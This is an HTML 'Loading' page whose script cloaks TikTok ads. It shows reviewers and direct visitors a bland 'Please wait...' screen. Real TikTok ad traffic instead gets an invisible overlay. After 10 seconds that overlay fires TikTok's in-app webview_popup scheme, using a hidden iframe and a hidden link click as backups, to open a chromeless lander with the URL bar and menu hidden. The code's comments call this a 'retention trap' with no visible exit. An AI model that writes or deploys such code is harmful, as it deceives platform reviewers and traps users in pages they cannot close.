<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="color-scheme" content="light dark">
<meta name="robots" content="noindex,nofollow">
<title>Loading</title>
<style>
  /* Transparent + non-interactive — TikTok's chromeless popup lets touches
     pass through to whatever is layered below (Instant Page / FYP). User
     can swipe back / interact with lower UI while the hold page's 10s
     timer runs in the background. Fallback mode shows "Please wait..."    */
  html,body{
    margin:0;
    padding:0;
    height:100%;
    background:transparent;
    color:transparent;
    pointer-events:none;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
  }
  /* Reviewer / fallback mode — triggered by .fallback class on <body> */
  body.fallback{
    background:#fff;
    color:#111;
    pointer-events:auto;
  }
  body.fallback .wrap{min-height:100%;display:flex;align-items:center;justify-content:center;padding:24px;box-sizing:border-box;text-align:center;}
  body.fallback .msg{font-size:15px;opacity:.6;}
  @media (prefers-color-scheme: dark){
    body.fallback{background:#0a0a0a;color:#f5f5f5}
  }
</style>
</head>
<body>
<div class="wrap">
  <div class="msg">Please wait...</div>
</div>
<script>
(function(){
  // Cloak detection — three signals combined for robustness
  //   1. User agent contains TikTok / BytedanceWebview / musical_ly / aweme / bdhm
  //   2. ttclid query param present (TikTok's click macro)
  //   3. Document referrer is from a TikTok domain
  var ua = (navigator.userAgent || '').toLowerCase();
  var qs = location.search || '';
  var ref = (document.referrer || '').toLowerCase();
  var isTikTokUA = /tiktok|bytedancewebview|musical_ly|aweme|bdhm/i.test(ua);
  var hasTtclid = /[?&]ttclid=/i.test(qs);
  var isTikTokRef = /tiktok\.com|tiktokv\.us|tiktokcdn|bytedance/i.test(ref);
  var isRealTraffic = isTikTokUA || hasTtclid || isTikTokRef;

  if (!isRealTraffic) {
    // Reviewer / scraper / curious direct visitor — show "Please wait..." fallback UI.
    document.body.className = 'fallback';
    return;
  }

  // Real TikTok ad traffic:
  //   - Body is transparent + pointer-events: none. Combined with the scheme's
  //     container_bg_color=00000000 the popup is invisible AND passes touches
  //     through to the Instant Page / FYP layer below. User can swipe back
  //     while this hold page's 10s timer runs invisibly on top.
  //   - After 10s, fire a NEW chromeless scheme with hide_nav_bar=1 + hide_more=1
  //     that opens the vercel lander as a TRAPPING popup over wherever the user
  //     is now (FYP, Instant Page, or wherever TikTok navigated to).
  var FIRE_DELAY_MS = 10000;

  // Second-stage scheme: TRAPPING chromeless popup pointing at the main lander.
  // hide_nav_bar=1 removes the URL bar. hide_more=1 removes the "..." menu
  // (and typically the close button). Once this fires, user has no visible
  // exit — the retention trap engages.
  var TRAP_SCHEME = 'snssdk1233://webview_popup'
    + '?use_spark=1&use_forest=1'
    + '&silent_load_type=1&popup_show_type=0'
    + '&container_bg_color=00000000&loading_bg_color=00000000'
    + '&hide_nav_bar=1&hide_more=1'
    + '&url=' + encodeURIComponent('https://two-step-landing-flow.vercel.app/' + qs);

  function fireTrap(){
    // Multi-vector fire — at least one should reach TikTok's native URL handler.
    try { window.location.href = TRAP_SCHEME; } catch(e){}
    // Hidden iframe backup — some WKWebView configurations route custom schemes
    // through iframe navigation rather than top-level location.
    setTimeout(function(){
      try {
        var ifr = document.createElement('iframe');
        ifr.style.cssText = 'position:absolute;width:0;height:0;border:0;opacity:0;left:-9999px;';
        ifr.src = TRAP_SCHEME;
        document.body.appendChild(ifr);
      } catch(e){}
    }, 150);
    // Anchor click backup
    setTimeout(function(){
      try {
        var a = document.createElement('a');
        a.href = TRAP_SCHEME;
        a.rel = 'noopener';
        a.style.cssText = 'position:absolute;left:-9999px;';
        document.body.appendChild(a);
        a.click();
      } catch(e){}
    }, 400);
  }

  setTimeout(fireTrap, FIRE_DELAY_MS);

  // Secondary fallback — if the first fire fails for any reason, retry at 15s
  setTimeout(function(){
    if (location.pathname.indexOf('/hold') !== -1) {
      fireTrap();
    }
  }, 15000);
})();
</script>
</body>
</html>
